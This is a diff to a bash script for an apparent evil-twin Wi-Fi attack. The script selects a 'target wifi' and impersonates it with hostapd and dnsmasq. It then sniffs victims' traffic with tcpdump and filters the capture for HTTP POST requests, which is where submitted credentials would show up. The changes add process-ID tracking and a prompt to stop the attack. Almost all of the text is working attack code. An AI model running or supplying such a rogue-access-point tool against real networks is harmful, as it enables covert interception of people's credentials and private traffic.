@@ -10,6 +10,8 @@ read internetInterface
 #Our variables to stock the ESSID and BSSID of the tested network
 finalESSID=""
 finalBSSID=""
+hostapdPID=""
+dnsmasqPID=""
 
 #We scan the near networks and select the one we want to test
 echo -e "[\e[0;33mi\e[0m] Please select the target wifi"
@@ -43,6 +45,9 @@ echo "no-resolv" >> dnsmasq.conf
 #We add the ip of our listening interface (router) and launch dnsmasq in background
 sudo ip addr add 192.168.1.1/24 dev "${listeningInterface}"
 sudo dnsmasq -d -C ./dnsmasq.conf& > /dev/null
+echo "$!"
+dnsmasqPID=$!
+
 echo -e "[\e[0;32mi\e[0m] Done!"
 
 #All the options to make hostapd working
@@ -54,6 +59,8 @@ echo "channel=11" >> hostapd.conf
 
 #We launch hostapd in background
 sudo hostapd hostapd.conf&
+echo "$!"
+hostapdPID=$!
 sleep 10
 echo -e "[\e[0;32mi\e[0m] Done!"
 
@@ -79,3 +86,12 @@ echo -e "[\e[0;33mi\e[0m] Please enter the number of seconds to sniff :"
 read tcpdumpTime
 sudo timeout ${tcpdumpTime} tcpdump -i ${listeningInterface} -w sniff.txt
 sudo wireshark -r sniff.txt -J "http.request.method == POST"
+echo -e "[\e[0;33mi\e[0m] Do you want to stop the attack ? Y/N"
+read stopAnsw
+if [ $stopAnsw = "Y" ]
+then
+  kill ${hostapdPID} ${dnsmasqPID}
+  echo -e "[\e[0;33mi\e[0m] Good bye !"
+else
+  echo -e "[\e[0;33mi\e[0m] Alright, let's continue !"
+fi
